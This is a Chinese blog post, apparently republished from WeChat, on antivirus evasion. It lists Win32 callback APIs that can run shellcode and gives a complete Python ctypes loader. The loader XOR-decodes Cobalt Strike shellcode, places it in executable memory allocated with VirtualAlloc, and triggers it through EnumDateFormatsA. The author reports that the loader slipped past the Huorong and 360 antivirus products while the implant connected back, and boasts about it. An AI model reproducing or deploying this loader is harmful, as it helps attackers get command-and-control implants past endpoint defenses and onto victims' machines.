<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/74wDqy_MMaUrve1FRZCqZg)

前言
--

免杀的话最好还是用c去实现，因为c编译后的体积比python编译后的体积小了太多了。因为python是解释型语言，所有的代码需要通过解释器去解释，同样的python的第三方库非常丰富，也就导致了python编译后的包含了各种各样的依赖导致体积会变得很庞大。

带有callback功能的Win32 Api函数
------------------------

参考项目地址：https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection

上面的链接是一个非常好的项目，汇总了可以调用shellcode的回调函数，因为我个人的水平原因，要学的实在太多了，没有办法把c学的很厉害，这里借花献佛把这些回调函数重复造轮子，写成py版本一 一测试各个回调函数的免杀效果。

`我对win32 api的形容方式可能不正确，懂得人可以批评指正！！！！`

```
 `EnumTimeFormatsA       Works` `EnumWindows        Works` `EnumDesktopWindows      Works` `EnumDateFormatsA      Works` `EnumChildWindows      Works` `EnumThreadWindows      Works` `EnumSystemLocales      Works` `EnumSystemGeoID      Works` `EnumSystemLanguageGroupsA    Works` `EnumUILanguagesA      Works` `EnumSystemCodePagesA    Works` `EnumDesktopsW      Works` `EnumSystemCodePagesW    Works`
```

  

python可以用的回调函数
--------------

python调用shellcode的本质其实是调用kernel32.dll这个动态库链接文件中的win32 api函数实现的shellcode调用。当然，网上也有通过python本身的内建函数实现的c类编程调用，但本质上还是用的c只是对这些东西做了封装。（我个人理解，也许不对！）

##### kernel32中存在的回调函数

```
`# 查看kernel32.dll文件中的函数， 需要自己vs2019或着vs其他版本使用dumpbin``dumpbin /exports kernel32.dll | findstr "Enum"`
```

我这里圈出了一些但是没有完全圈出，后面测试一下哪些可以被利用。

![](https://mmbiz.qpic.cn/mmbiz_png/szpmeDEzXI8WqU6Bzo0jgJEBBMGGTQ4xfibruQ5PykqH5O9icgqq9IJdD45PKH9KYLXicCIfydxzL3W5AbSz0cJVg/640?wx_fmt=png)

  

正题
--

我这里使用CS的shellcode，统一用xor异或编码对shellcode做混肴。

##### EnumDateFormats

此函数枚举指定区域设置可用的长日期或短日期格式，包括任何替代日历的日期格式。

```
`win32原型：``BOOL EnumDateFormats(``DATEFMT_ENUMPROC lpDateFmtEnumProc, //指向应用程序定义的回调函数的指针。``LCID Locale, //指定要检索日期格式信息的区域设置``DWORD dwFlags //指定感兴趣的日期格式``);` `lpDateFmtEnumProc：回调函数位置，对于我们来讲此处放入注入shellcode后的虚拟内存句柄。``LCID Locale：这个参数用指定要检索日期格式信息的区域设置，可以不设置，但是py数据类型要对` `LOCALE_SYSTEM_DEFAULT 默认的系统语言环境.` `LOCALE_USER_DEFAULT 默认用户语言环境.` `LOCALE_NEUTRAL 默认语言中立的语言环境.``DWORD dwFlags：这个参数指定感兴趣的日期格式，可以不设置，但是py数据格式要对` `DATE_SHORTDATE 返回短日期格式.` `DATE_LONGDATE 返回长日期格式.`
```

  
以EnumDateFormats调用shellcode

```
`# -*- coding: utf-8 -*-``# @Time : 2022-01-18 0:48``# @Author : ILU``# @File : EnumDateFormatsA.py``import ctypes``# 异或后的shellcode``sc = b’'.decode()``# 还原的key``key = 50``# 把异或还原``buf = [ord(sc[i]) ^ key for i in range(len(sc))]``# 转为可变字节的shellcode``buf = bytearray(buf)``# 对模块功能取别名为kernel32``kernel32 = ctypes.windll.kernel32``# 指定函数返回的数据类型``kernel32.VirtualAlloc.restype = ctypes.c_uint64``# 申请虚拟内存``ptr = kernel32.VirtualAlloc(` `ctypes.c_int(0),` `ctypes.c_int(len(buf)),` `ctypes.c_int(0x00001000),  # #define MEM_COMMIT  0x00001000` `ctypes.c_int(0x40)  # #define PAGE_EXECUTE_READWRITE  0x40``)``# 把shellcode送入缓冲区``buffer = (ctypes.c_char * len(buf)).from_buffer(buf)``# 把缓冲区中的shellcode移入虚拟内存``kernel32.RtlMoveMemory(` `ctypes.c_uint64(ptr),` `buffer,` `ctypes.c_int(len(buf))``)``# EnumDateFormats调用shellcode``# 数据类型通过vs2019转到对应变量名即可查看``# 第一个参数：char *``# 第二个参数：DWORD``# 第三个参数：DWORD``kernel32.EnumDateFormatsA(ctypes.c_char_p(ptr), ctypes.c_int16(0), ctypes.c_int16(0))``# 关闭句柄``kernel32.CloseHandle(ptr)`
```

直接查杀火绒不报毒。

![](https://mmbiz.qpic.cn/mmbiz_png/szpmeDEzXI8WqU6Bzo0jgJEBBMGGTQ4xN4EwZL4x1pxMJhGVxTIqKWSVfkjVYic4R8BPlbgu669Xcp4zbiadlqsg/640?wx_fmt=png)

  

查看上线情况是否正常，检测结果发现正常上线。

![](https://mmbiz.qpic.cn/mmbiz_png/szpmeDEzXI8WqU6Bzo0jgJEBBMGGTQ4xsDVsFKjvW00IgAt5URGOhia7f888xzubeZt8NjnF6y3qlbtcO8bUynA/640?wx_fmt=png)

  

编译py文件，查看免杀效果，本地编译完发现火绒编译过程未报毒。

![](https://mmbiz.qpic.cn/mmbiz_png/szpmeDEzXI8WqU6Bzo0jgJEBBMGGTQ4xwb7g9WYeNJIRY1LNwSl7jX8j7RVyw20DhckiaHsooEuNAGfRwZnYN1A/640?wx_fmt=png)

查看上线情况，正常上线，火绒未报毒，同时动态检测也过了，顺便测测360的免杀情况。

![](https://mmbiz.qpic.cn/mmbiz_png/szpmeDEzXI8WqU6Bzo0jgJEBBMGGTQ4xWeaG3ku9o1VSCsfEreNicjerLlSDMtgo27q7kJDJ5gtx8ziaiadAl44kg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/szpmeDEzXI8WqU6Bzo0jgJEBBMGGTQ4xX6d7QykpyORBnn5sSsD9cg7VKOric4zvDgbzsxfFgSpY4v1e1O15F9w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/szpmeDEzXI8WqU6Bzo0jgJEBBMGGTQ4x3XZTwLovJtoAjFwwcOuzYKUYHWOojcOkZpCWQxgj4iczNIibRINEXs3Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/szpmeDEzXI8WqU6Bzo0jgJEBBMGGTQ4xQ8OU4wZM7RQFZGOoIZjLaFnBVM14AbgovM6IbMCTlqBGf0n8mlZYicA/640?wx_fmt=png)

以目前的情况来讲，单是吊打某绒和某60时没有压力的，两个安全防护软件漏洞库都为最新版。如果此方法不免啥，再稍微做下资源修改，又是一条好汉。

星球二维码  
-------

![](https://mmbiz.qpic.cn/mmbiz_png/szpmeDEzXI8WqU6Bzo0jgJEBBMGGTQ4xCiad6akWJibJtfRtUrlzib58icibILMYwlwI0ozSG1gH0icOVc9LibzqtJpnA/640?wx_fmt=png)